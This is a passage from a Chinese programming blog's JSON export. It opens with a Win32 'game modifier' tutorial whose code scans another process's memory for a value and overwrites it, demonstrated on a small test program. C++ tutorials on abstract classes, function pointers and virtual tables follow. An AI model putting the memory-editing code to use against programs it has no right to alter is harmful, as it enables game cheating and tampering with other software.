//目标进程中待读内容的起始位置PVOID pvBufferLocal, //用来接受读取数据的缓冲区DWORD dwSize, //要读取的字节数PDWORD pdwNumBytesRead //用来供函数返回实际读取的字节数); WriteProcessMemory是计算机语言中的一种函数。此函数能写入某一进程的内存区域（直接写入会出Access Violation错误），故需此函数入口区必须可以访问，否则操作将失败。 1234567BOOL WriteProcessMemory(HANDLE hProcess, //由OpenProcess返回的进程句柄。LPVOID lpBaseAddress, //要写的内存首地址LPVOID lpBuffer, //指向要写的数据的指针。DWORD nSize, //要写入的字节数。LPDWORD lpNumberOfBytesWritten //用来供函数返回实际写入的字节数); 应该在目标进程的整个用户地址空间进行搜索。在进程的整个4GB地址中，Windows 98系列的操作系统为应用程序预留的是4MB到2GB部分，Windows2000系列的操作系统预留的是64KB到2GB部分，所以在搜索前还要先判断操作系统的类型，以决定搜索的范围。 OSVERSIONINFO 操作系统的信息版本结构 123456789101112131415typedef struct _OSVERSIONINFO &#123;DWORD dwOSVersionInfoSize; // 本结构的大小，必须在调用之前设置DWORD dwMajorVersion;//操作系统的主版本号DWORD dwMinorVersion;//操作系统的次版本号DWORD dwBuildNumber;//操作系统的编译版本号DWORD dwPlatformld;//操作系统平台。可以是VER_PLATFORM_WIN32_NT (2000系列)等TCHAR szCSDVersion[128];//指定安装在系统上的最新服务包，例如“Service Pack3&quot;等&#125; OSVERSIONINFO; GetVersionEX返回当前操作系统的版本号（在64位系统上是32位字节长度）。 123BOOL GetVersionEx(LPOSVERSIONINFO lpVersionInformation // 指向版本信息结构体的指针); 游戏修改器例子 Windows采用了分页机制来管理内存，每页的大小是4KB (在x86处理器上)。也就是说Windows是以4KB为单位来为应用程序分配内存的。所以可以按页来搜索目标内存，以提高搜索效率。下面的CompareAPage函数的功能就是比较目标进程内存中1页大小的内存。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160///////////////////////////////////////////////////////////////// 02MemRepair.cpp文件#define _CRT_SECURE_NO_WARNINGS#include \"windows.h\"#include \"stdio.h\"#include &lt;iostream&gt;BOOL FindFirst(DWORD dwValue); // 在目标进程空间进行第一次查找BOOL FindNext(DWORD dwValue); // 在目标进程地址空间进行第2、3、4……次查找DWORD g_arList[1024]; // 地址列表int g_nListCnt; // 有效地址的个数HANDLE g_hProcess; // 目标进程句柄//////////////////////BOOL WriteMemory(DWORD dwAddr, DWORD dwValue);void ShowList();int main(int argc, char* argv[])&#123; // 启动02testor进程 char szFileName[] = \"ConsoleApplication1.exe\"; STARTUPINFO si = &#123; sizeof(si) &#125;; PROCESS_INFORMATION pi; ::CreateProcess(NULL, szFileName, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi); // 关闭线程句柄，既然我们不使用它 ::CloseHandle(pi.hThread); g_hProcess = pi.hProcess; // 输入要修改的值 int iVal; printf(\" Input val = \"); scanf(\"%d\", &amp;iVal); // 进行第一次查找 FindFirst(iVal); // 打印出搜索的结果 ShowList(); while(g_nListCnt &gt; 1) &#123; printf(\" Input val = \"); scanf(\"%d\", &amp;iVal); // 进行下次搜索 FindNext(iVal); // 显示搜索结果 ShowList(); &#125; // 取得新值 printf(\" New value = \"); scanf(\"%d\", &amp;iVal); // 写入新值 if(WriteMemory(g_arList[0], iVal)) printf(\" Write data success \\n\"); ::CloseHandle(g_hProcess); return 0;&#125;BOOL CompareAPage(DWORD dwBaseAddr, DWORD dwValue)&#123; // 读取1页内存 BYTE arBytes[4096]; if(!::ReadProcessMemory(g_hProcess, (LPVOID)dwBaseAddr, arBytes, 4096, NULL)) return FALSE; // 此页不可读 // 在这1页内存中查找 DWORD* pdw; for(int i=0; i&lt;(int)4*1024-3; i++) &#123; pdw = (DWORD*)&amp;arBytes[i]; if(pdw[0] == dwValue) // 等于要查找的值？ &#123; if(g_nListCnt &gt;= 1024) return FALSE; // 添加到全局变量中 g_arList[g_nListCnt++] = dwBaseAddr + i; &#125; &#125; return TRUE;&#125;BOOL FindFirst(DWORD dwValue)&#123; const DWORD dwOneGB = 1024*1024*1024; // 1GB const DWORD dwOnePage = 4*1024; // 4KB if(g_hProcess == NULL) return FALSE; // 查看操作系统类型，以决定开始地址 DWORD dwBase; OSVERSIONINFO vi = &#123; sizeof(vi) &#125;; ::GetVersionEx(&amp;vi); if (vi.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwBase = 4*1024*1024; // Windows 98系列，4MB else dwBase = 64*1024; // Windows NT系列，64KB // 在开始地址到2GB的地址空间进行查找 for(; dwBase &lt;2*dwOneGB; dwBase += dwOnePage) &#123; // 比较1页大小的内存 CompareAPage(dwBase, dwValue); &#125; return TRUE;&#125;BOOL FindNext(DWORD dwValue)&#123; // 保存m_arList数组中有效地址的个数，初始化新的m_nListCnt值 int nOrgCnt = g_nListCnt; g_nListCnt = 0; // 在m_arList数组记录的地址处查找 BOOL bRet = FALSE; // 假设失败 DWORD dwReadValue; for(int i=0; i&lt;nOrgCnt; i++) &#123; if(::ReadProcessMemory(g_hProcess, (LPVOID)g_arList[i], &amp;dwReadValue, sizeof(DWORD), NULL)) &#123; if(dwReadValue == dwValue) &#123; g_arList[g_nListCnt++] = g_arList[i]; bRet = TRUE; &#125; &#125; &#125; return bRet;&#125;// 打印出搜索到的地址void ShowList()&#123; for(int i=0; i&lt; g_nListCnt; i++) &#123; printf(\"%08lX \\n\", g_arList[i]); &#125;&#125;BOOL WriteMemory(DWORD dwAddr, DWORD dwValue)&#123; return ::WriteProcessMemory(g_hProcess, (LPVOID)dwAddr, &amp;dwValue, sizeof(DWORD), NULL);&#125; 123456789101112131415161718192021222324///////////////////////////////////////////////////////////////// 02Testor.cpp文件#include &lt;stdio.h&gt;// 全局变量测试int g_nNum; int main(int argc, char* argv[])&#123; int i = 198; // 局部变量测试 g_nNum = 1003; while(1) &#123; // 输出个变量的值和地址 printf(\" i = %d, addr = %08lX; g_nNum = %d, addr = %08lX \\n\", ++i, &amp;i, --g_nNum, &amp;g_nNum); getchar(); &#125; return 0;&#125;","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"windows程序设计基础","slug":"win0001-windows程序设计基础","date":"2021-05-18T17:32:42.000Z","updated":"2021-05-18T18:05:13.407Z","comments":true,"path":"2021/05/19/win0001-windows程序设计基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/19/win0001-windows程序设计基础/","excerpt":"","text":"windows程序设计基础 Win32 API 简介 API(Application Programming Interface) 应用程序编程接口 提供了各种各样与windows系统服务有关的函数 SDK编程就是直接调用API函数进行编程 Win32 API 是指编制32应用程序时使用的一组函数、结构、宏定义。 应用程序类型 windows支持两种类型的应用程序: Graphical User Interface（GUI ）图形用户界面 Console User Interface（CUI ）控制台用户界面 API函数的调用方法 1234567891011121314///////////////////////////////////////////////////////////////// 01FirstApp.cpp文件#include &lt;windows.h&gt; // 包含MessageBox函数声明的头文件int main(int argc, char* argv[])&#123; // 调用API函数MessageBox int nSelect = ::MessageBox(NULL, &quot;Hello, Windows XP&quot;, &quot;Greetings&quot;, MB_OKCANCEL); if(nSelect == IDOK) printf(&quot; 用户选择了“确定”按钮 \\n&quot;); else printf(&quot; 用户选择了“取消”按钮 \\n&quot;); return 0;&#125; 调用windows API 需要包含windows.h头文件 ::MessageBox 在函数前面加上::表示是一个全局函数与c++成员函数区分开 代码风格 变量的命名 【限定范围的前缀】 + 【数据类型前缀】+【有意义的单词】 g_szTitle 常量：用全大写字母 全局变量：g_开头 sz开头：表示以‘\\0’结尾的字符串 类的成员变量：以m_开头 局部变量：【数据类型前缀】+【有意义的单词】bResult b代表BOOL类型 函数名：每个单词首字母大写 CreateFile 类名：CStudent C代表class 结构体：SStudent S代表struct","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"面向抽象类编程实现计算程序员工资","slug":"cpp0060-面向抽象类编程实现计算程序员工资","date":"2021-05-14T10:47:25.000Z","updated":"2021-12-28T18:38:31.199Z","comments":true,"path":"2021/05/14/cpp0060-面向抽象类编程实现计算程序员工资/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/14/cpp0060-面向抽象类编程实现计算程序员工资/","excerpt":"","text":"面向抽象类编程实现计算程序员工资 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;/*抽象层*///程序员抽象类class Programmer&#123;public: //打印程序员工资纯虚函数 virtual void PrintPaid() = 0; Programmer() &#123;&#125;; Programmer(double tPaid) :paid(tPaid) &#123;&#125;; virtual ~Programmer() &#123; cout &lt;&lt; \"~Programmer()...\" &lt;&lt; endl; &#125; //获取程序员工资 double getPaid() &#123; return paid; &#125;private: double paid;&#125;;/*实现层*///初级程序员类class Junior_programmer : public Programmer &#123;public: Junior_programmer()&#123;&#125; Junior_programmer(double paid):Programmer(paid)&#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Junior_programmer :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Junior_programmer() &#123; cout &lt;&lt; \"~Junior_programmer()...\" &lt;&lt; endl; &#125;&#125;;//中级程序员类class Mid_programmer : public Programmer&#123;public: Mid_programmer()&#123;&#125; Mid_programmer(double paid) :Programmer(paid) &#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Mid_programmer :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Mid_programmer() &#123; cout &lt;&lt; \"~Mid_programmer()...\" &lt;&lt; endl; &#125;&#125;;//高级程序员类class Adv_programmer : public Programmer &#123;public: Adv_programmer(double paid) :Programmer(paid) &#123;&#125; Adv_programmer()&#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Adv_programmer :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Adv_programmer() &#123; cout &lt;&lt; \"~Adv_programmer()...\" &lt;&lt; endl; &#125;&#125;;//架构师类class Architect : public Programmer&#123;public: Architect(double paid) :Programmer(paid) &#123;&#125; Architect()&#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Architect :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Architect() &#123; cout &lt;&lt; \"~Architect\" &lt;&lt; endl; &#125;&#125;;/*后序拓展只需要 1.创建一个类并继承Programmer 2.重写virtual void PrintPaid()函数*//*class XXX : public Programmer &#123;public: virtual void PrintPaid() &#123; cout &lt;&lt; \"XXX :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125;&#125;;*/void ShowProgrammerPaid(Programmer * p) &#123; if (p != NULL) &#123; p-&gt;PrintPaid(); delete p; p = NULL; &#125; cout &lt;&lt; \"====================\" &lt;&lt; endl &lt;&lt; endl;&#125;/*业务逻辑层*/int main(char *argv[], int argc)&#123; ShowProgrammerPaid(new Junior_programmer(10000)); ShowProgrammerPaid(new Mid_programmer(15000)); ShowProgrammerPaid(new Adv_programmer(20000)); ShowProgrammerPaid(new Architect(30000)); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"C语言函数指针的锦囊妙计","slug":"cpp0059-C语言函数指针的锦囊妙计","date":"2021-05-13T18:17:04.000Z","updated":"2021-12-28T18:38:28.036Z","comments":true,"path":"2021/05/14/cpp0059-C语言函数指针的锦囊妙计/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/14/cpp0059-C语言函数指针的锦囊妙计/","excerpt":"","text":"C语言函数指针的锦囊妙计 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;// 定义一个锦囊的方法 是一个函数指针，类似于c++的纯虚函数typedef void(TIPS_FUNC)(void);//写一个锦囊的结构体struct tips&#123; char from[64]; //这个锦囊是谁写的 char to[64]; //写给谁的 TIPS_FUNC *fp; //具体锦囊的内容&#125;;//写一个供赵云调用的架构函数void open_tips(struct tips * tp)&#123; cout &lt;&lt; \"打开了锦囊\" &lt;&lt; endl; cout &lt;&lt; \"此锦囊是由\" &lt;&lt; tp-&gt;from &lt;&lt; \", 写给\" &lt;&lt; tp-&gt;to &lt;&lt; endl; cout &lt;&lt; \"内容是\" &lt;&lt; endl; tp-&gt;fp();//拆开锦囊，调用具体锦囊的方法&#125;//实现一个一个的锦囊 //类似于实现一个纯虚函数void tips_1(void)&#123; cout &lt;&lt; \"一到东吴就大张旗鼓找乔国老\" &lt;&lt; endl;&#125;void tips_2(void)&#123; cout &lt;&lt; \"骗刘备 操作压境\" &lt;&lt; endl;&#125;void tips_3(void)&#123; cout &lt;&lt; \"找孙尚香求救\" &lt;&lt; endl;&#125;void tips_4(void)&#123; cout &lt;&lt; \"你们就死在东吴把\" &lt;&lt; endl;&#125;struct tips* create_tips(char *from, char *to, TIPS_FUNC *fp)&#123; struct tips *tp = (struct tips*)malloc(sizeof(struct tips)); if (tp == NULL) &#123; return NULL; &#125; strcpy(tp-&gt;from, from); strcpy(tp-&gt;to, to); //注册回调函数 tp-&gt;fp = fp; //给拥有函数指针的结构体 函数指针变量 赋值 就是 注册回调函数 return tp;&#125;void destory_tips(struct tips * tp)&#123; if (tp != NULL) &#123; free(tp); &#125;&#125;int main(void)&#123; //诸葛亮去写锦囊 struct tips * tp1 = create_tips(\"孔明\", \"赵云\", tips_1); struct tips * tp2 = create_tips(\"孔明\", \"赵云\", tips_2); struct tips * tp3 = create_tips(\"孔明\", \"赵云\", tips_3); struct tips *tp4= create_tips(\"庞统\", \"赵云\", tips_4); // 赵云去拆机囊 cout &lt;&lt; \"刚来到 东吴境内 ，打开了第一个锦囊\" &lt;&lt; endl; open_tips(tp1); cout &lt;&lt; \"刘备乐不思蜀 ，打开第二个锦囊 \" &lt;&lt; endl; open_tips(tp2); cout &lt;&lt; \"孙权追杀刘备, 打开第三个锦囊\" &lt;&lt; endl; open_tips(tp3); cout &lt;&lt; \"赵云发现 抵挡不住 军队，想到了庞统的最后一个锦囊 打开了\" &lt;&lt; endl; open_tips(tp4); destory_tips(tp1); destory_tips(tp2); destory_tips(tp3); destory_tips(tp4); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"函数指针的语法和意义","slug":"cpp0058-函数指针的语法和意义","date":"2021-05-13T17:50:06.000Z","updated":"2021-12-28T18:38:24.390Z","comments":true,"path":"2021/05/14/cpp0058-函数指针的语法和意义/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/14/cpp0058-函数指针的语法和意义/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//定义一个函数int func(int a, int b) &#123; cout &lt;&lt; \"func 111 \" &lt;&lt; endl; return 0;&#125;//定义一个函数指针// C语言中 决定一个函数类型// 返回值 参数列表typedef int(FUNC)(int, int); //定义一个函数类型typedef int(*FUNC_POINTER)(int, int); //定义一个函数指针类型//如何将一个函数指针当成一个函数参数呢？void my_function(FUNC *fp)&#123; fp(10, 20);&#125;void my_function2(FUNC_POINTER fp)&#123; fp(10, 20);&#125;//他是一个架构函数。 void my_function3(int(*fp)(int, int))&#123; cout &lt;&lt; \"1999 年写的架构\" &lt;&lt; endl; cout &lt;&lt; \"固定业务1\" &lt;&lt; endl; fp(10, 20); cout &lt;&lt; \"固定业务2\" &lt;&lt; endl;&#125;//2015 实现一个子函数int my_new_function(int a, int b)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"2015年实现的新业务\" &lt;&lt; endl; return 0;&#125;int main(void)&#123; FUNC * p = func; FUNC_POINTER p2 = func; int(*fp)(int, int) = func; p(10, 20); (*p)(10, 20); //以上两种写法等价 p2(10, 20); (*p2)(20, 20); fp(10, 20); cout &lt;&lt; \" -------- \" &lt;&lt; endl; //2015 实现一个子函数，再调用1999的架构 my_function3(my_new_function); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"利用抽象类实现电脑组装案例","slug":"cpp0057-利用抽象类实现电脑组装案例","date":"2021-05-13T15:44:59.000Z","updated":"2021-12-28T18:38:21.148Z","comments":true,"path":"2021/05/13/cpp0057-利用抽象类实现电脑组装案例/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0057-利用抽象类实现电脑组装案例/","excerpt":"","text":"利用抽象类实现电脑组装案例 面向抽象类编程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;/*===========start抽象层============*///CPU抽象类class CPU &#123;public: virtual void caculate() = 0;&#125;;//显卡抽象类class Card &#123;public: virtual void display() = 0;&#125;;//内存条抽象类class Memory &#123;public: virtual void storage() = 0;&#125;;class Computer &#123;public: Computer(CPU *tcpu1, Card * tcard, Memory * tmemory) :cpu1(tcpu1), card(tcard), memory(tmemory) &#123;&#125;; void print() &#123; cpu1-&gt;caculate(); card-&gt;display(); memory-&gt;storage(); cout &lt;&lt; \"=========================\" &lt;&lt; endl; &#125;private: CPU *cpu1; Card * card; Memory * memory;&#125;;/*===========end抽象层============*//*===========start实现层============*///Intel//IntelCPUclass IntelCpu :public CPU &#123;public: virtual void caculate() &#123; cout &lt;&lt; \"IntelCPU\" &lt;&lt; endl; &#125;&#125;;//Intel显卡class IntelCard : public Card &#123;public: virtual void display() &#123; cout &lt;&lt; \"IntelCard\" &lt;&lt; endl; &#125;;&#125;;//Intel内存条class IntelMemory :public Memory &#123;public: virtual void storage() &#123; cout &lt;&lt; \"IntelMemory\" &lt;&lt; endl; &#125;;&#125;;//NIVDE显卡class NVIDIACard : public Card &#123;public: virtual void display() &#123; cout &lt;&lt; \"NVIDIACard\" &lt;&lt; endl; &#125;;&#125;;//Kingston内存条class KingstonMemory :public Memory &#123;public: virtual void storage() &#123; cout &lt;&lt; \"KingstonMemory\" &lt;&lt; endl; &#125;;&#125;;/*===========end实现层============*//*===========业务逻辑层============*/int main(char *argv[], int argc)&#123; //组装一台纯Intel的电脑 Computer p1(new IntelCpu,new IntelCard,new IntelMemory); p1.print(); //组装一台IntelCpu,NVIDIACard,KingstonMemory的电脑 Computer p2(new IntelCpu, new NVIDIACard, new KingstonMemory); p2.print(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"纯虚函数和抽象类","slug":"cpp0056-纯虚函数和抽象类","date":"2021-05-12T23:33:38.000Z","updated":"2021-12-28T18:38:11.391Z","comments":true,"path":"2021/05/13/cpp0056-纯虚函数和抽象类/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0056-纯虚函数和抽象类/","excerpt":"","text":"纯虚函数和抽象类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//图形类//拥有纯虚函数的类， 就叫抽象类class Shape&#123;public: //是一个抽象的接口，说明图形是有一个得到面积方法 virtual double getArea() = 0;//代表一个接口，一个求图形面积的接口 //定义一个个打印面积的接口 virtual void print() = 0;&#125;;//圆类//如果 一个子类继承了抽象类， 那么一定要重写这个纯虚函数。class Circle :public Shape&#123;public: Circle(double r) &#123; this-&gt;r = r; &#125; //重写父类抽象类的纯虚函数 virtual double getArea() &#123; return 3.14 * r * r; &#125; virtual void print() &#123; cout &lt;&lt; \"圆的面积是\" &lt;&lt; endl; cout &lt;&lt; this-&gt;getArea() &lt;&lt; endl; &#125; private: double r;//半径&#125;;//实现一个正方形class Rect :public Shape&#123;public: Rect(double a) &#123; this-&gt;a = a; &#125; //是一个抽象的接口，说明图形是有一个得到面积方法 virtual double getArea() &#123; return a*a; &#125; //顶一个打印面积的接口 virtual void print() &#123; cout &lt;&lt; \"正方形的面积是\" &lt;&lt; endl; cout &lt;&lt; this-&gt;getArea() &lt;&lt; endl; &#125;private: double a;//边长&#125;;//三角形class Tri :public Shape&#123;public: Tri(double a, double h) &#123; this-&gt;a = a; this-&gt;h = h; &#125; virtual double getArea() &#123; return 0.5 * h * a; &#125; virtual void print() &#123; cout &lt;&lt; \"三角形的面积是\" &lt;&lt; endl; cout &lt;&lt; this-&gt;getArea() &lt;&lt; endl; &#125;private: double a;//底 double h;//高&#125;;//一个传递抽象类 指针的架构函数void printArea(Shape *p)&#123; p-&gt;print();&#125;//业务层int main(void)&#123; //Shape p;//抽象类不能够实例化 Shape *sp = new Circle(10.0); //抽象类的指针就可以调用纯虚函数， 接口 //sp-&gt;getArea();//在此处就发生了多态 //cout &lt;&lt; sp-&gt;getArea() &lt;&lt; endl; //delete sp; printArea(sp); delete sp; //创建一个正方形的对象。用抽象类指针（父类指针）指向子类对象 sp = new Rect(10.0); printArea(sp); delete sp; //业务层 根本就不关心 具体对象怎么实现的， 只用抽象类的指针就可以。 Shape *sp2 = new Tri(10, 20); sp2-&gt;print(); delete sp2; cout &lt;&lt; \" ------ \" &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"父类指针和子类指针的步长","slug":"cpp0055-父类指针和子类指针的步长","date":"2021-05-12T22:31:49.000Z","updated":"2021-12-28T18:38:07.452Z","comments":true,"path":"2021/05/13/cpp0055-父类指针和子类指针的步长/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0055-父类指针和子类指针的步长/","excerpt":"","text":"父类指针和子类指针的步长 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Parent&#123;public: Parent(int a) &#123; this-&gt;a = a; &#125; virtual void print() &#123; cout &lt;&lt; \"Parent::print() \" &lt;&lt; a &lt;&lt; endl; &#125;protected: int a;&#125;;class Child :public Parent&#123;public: Child(int a) :Parent(a) &#123; &#125; virtual void print() &#123; cout &lt;&lt; \"Child :: Print() \" &lt;&lt; a &lt;&lt;endl; &#125;private: int b;&#125;;int main(void)&#123; Child array[] = &#123;Child(0), Child(1), Child(2) &#125;; // array[0] array[1] array[2] Child *cp = &amp;array[0]; Parent *pp = &amp;array[0]; cp-&gt;print(); //Child:: pp-&gt;print(); //Child::发生多态 cout &lt;&lt; \"------\" &lt;&lt; endl; cp++; //Child::12 //pp++;//8 pp = cp; cp-&gt;print(); pp-&gt;print(); cout &lt;&lt; \" ----- \" &lt;&lt; endl; int i = 0; for (i = 0, cp = &amp;array[0], pp = cp; i &lt; 3; i++, cp++, pp =cp) &#123; pp-&gt;print(); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Fu&#123;public: Fu(); Fu(int ta): a(ta) &#123;&#125;; ~Fu(); virtual void print() &#123; cout &lt;&lt; \"Fu a = \"&lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;class Zi : public Fu&#123;public: Zi(); Zi(int a, int tb) :Fu(a) ,b(tb)&#123;&#125;; virtual void print() &#123; cout &lt;&lt; \"Zi b = \" &lt;&lt; b &lt;&lt; endl; &#125; ~Zi(); private: int b;&#125;;Zi::Zi()&#123;&#125;Zi::~Zi()&#123;&#125;Fu::Fu()&#123;&#125;Fu::~Fu()&#123;&#125;int main(char *argv[], int argc)&#123; Zi zi[] = &#123; Zi(100,200),Zi(300,400),Zi(500,600) &#125;; Fu * pFu = zi; /* 会崩溃,因为(pFu + i) == (pFu + sizeof Fu) 而不是(pFu + sizeof Zi) for (int i = 0; i &lt; 3; i++) &#123; (pFu + i)-&gt;print(); &#125; */ //解决方法 Zi * zi1[] = &#123; new Zi(1,2),new Zi(3,4), new Zi(5,6), new Zi(7,8) &#125;; for (int i = 0; i &lt; sizeof(zi1) / sizeof(Zi *); i++) &#123; pFu = zi1[i]; pFu-&gt;print(); &#125; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"vptr指针的分布初始化","slug":"cpp0054-vptr指针的分布初始化","date":"2021-05-12T22:27:20.000Z","updated":"2021-12-28T18:38:03.848Z","comments":true,"path":"2021/05/13/cpp0054-vptr指针的分布初始化/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0054-vptr指针的分布初始化/","excerpt":"","text":"vptr指针的分布初始化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;// 不要在构造函数中去调用成员函数。class Parent&#123;public: Parent(int a) &#123; cout &lt;&lt; \"Parent(int a)....\" &lt;&lt; endl; this-&gt;a = a; print(); //这个print打印的是 Parent 还是 Child的？ //调用的是父类的 &#125; //虚函数 virtual void print() &#123; cout &lt;&lt; \"Parent::print(): \" &lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;class Child : public Parent&#123;public: Child(int a, int b) :Parent(a) &#123; //vptr指针就执行的子类的虚函数表 print(); //执行的child ？ 还是 parent? //再此处之前， 是构造父类的内存空间 此时child还有没构造完毕，vptr指针此时指向的是父类的虚函数表 cout &lt;&lt; \"Child() ...\" &lt;&lt; endl; this-&gt;b = b; &#125; //重写了父类的虚函数 virtual void print() &#123; cout &lt;&lt; \"Child::print() \"&lt;&lt; \" , \" &lt;&lt;b &lt;&lt; endl; &#125;private: int b;&#125;;int main(void)&#123; Parent *p = new Child(10, 20);//在此调用Child 的构造函数 p-&gt;print(); //此时发生了多态 delete p; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"验证vptr指针的存在","slug":"cpp0053-验证vptr指针的存在","date":"2021-05-12T22:24:38.000Z","updated":"2021-12-28T18:38:00.671Z","comments":true,"path":"2021/05/13/cpp0053-验证vptr指针的存在/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0053-验证vptr指针的存在/","excerpt":"","text":"验证vptr指针的存在 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Parent&#123;public: void func(int a, int b) &#123; cout &lt;&lt; \"Parent func \" &lt;&lt; endl; &#125;private: int a;&#125;;class Parent2&#123;public: virtual void func(int a, int b) &#123; cout &lt;&lt; \"Parent2 func \" &lt;&lt; endl; &#125;private: int a;&#125;;int main(void)&#123; Parent p1; Parent2 p2; cout &lt;&lt; \"sizeof(p1)\" &lt;&lt; sizeof(p1) &lt;&lt; endl; cout &lt;&lt; \"sizeof(p2)\" &lt;&lt; sizeof(p2) &lt;&lt; endl; //p2多出来的4个字节就是存放vptr指针的空间大小 //vptr指针我们访问不了，vptr指针指向的是Parent2类的虚函数表 //此表中目前有一个 虚函数 func(inta, intb)的入口地址。 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"多态的原理","slug":"cpp0052-多态的原理","date":"2021-05-12T22:15:59.000Z","updated":"2021-12-28T18:37:54.941Z","comments":true,"path":"2021/05/13/cpp0052-多态的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0052-多态的原理/","excerpt":"","text":"多态的原理","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"重载重写重定义","slug":"cpp0051-重载重写重定义","date":"2021-05-12T19:05:42.000Z","updated":"2021-12-28T18:37:50.581Z","comments":true,"path":"2021/05/13/cpp0051-重载重写重定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0051-重载重写重定义/","excerpt":"","text":"重载重写重定义","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"虚析构函数","slug":"cpp0050-虚析构函数","date":"2021-05-12T18:49:15.000Z","updated":"2021-12-28T18:37:47.378Z","comments":true,"path":"2021/05/13/cpp0050-虚析构函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0050-虚析构函数/","excerpt":"","text":"虚析构函数 通过父类指针将所有子类对象析构掉,需要用到虚析构函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class A&#123;public: A() &#123; cout &lt;&lt; \"A() ...\" &lt;&lt; endl; this-&gt;p = new char[64]; //给p开辟了一个空间 memset(p, 0, 64); strcpy(p, \"A string \"); &#125; virtual void print() &#123; cout 